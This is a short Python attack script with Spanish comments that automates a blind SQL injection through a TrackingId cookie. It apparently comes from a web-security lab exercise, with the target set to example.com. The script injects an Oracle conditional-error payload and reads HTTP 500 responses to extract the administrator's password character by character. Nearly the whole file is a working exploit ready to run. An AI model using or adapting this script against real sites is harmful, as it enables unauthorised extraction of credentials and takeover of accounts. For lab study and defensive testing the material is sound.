#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
	print("\n\n[!]Saliendo...\n ")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#URL objetivo
main_url = "https://example.com"
characters = string.ascii_lowercase + string.digits

def makeRequest():

	password=""

	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Password")

	for position in range(1, 21):
		for character in characters:
#ejemplo de cookies de sesion
			cookies = {
				'TrackingId': "TrackingId=mem6IwFzxKlESgXU'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
				'session': 'uJHTeMzX5wg1amM3988E4XymaxxvOwYe'
			}

			r = requests.get(main_url, cookies=cookies)

			if r.status_code == 500:
				password += character
				p2.status(password)
				break


if __name__ == '__main__':

	makeRequest()
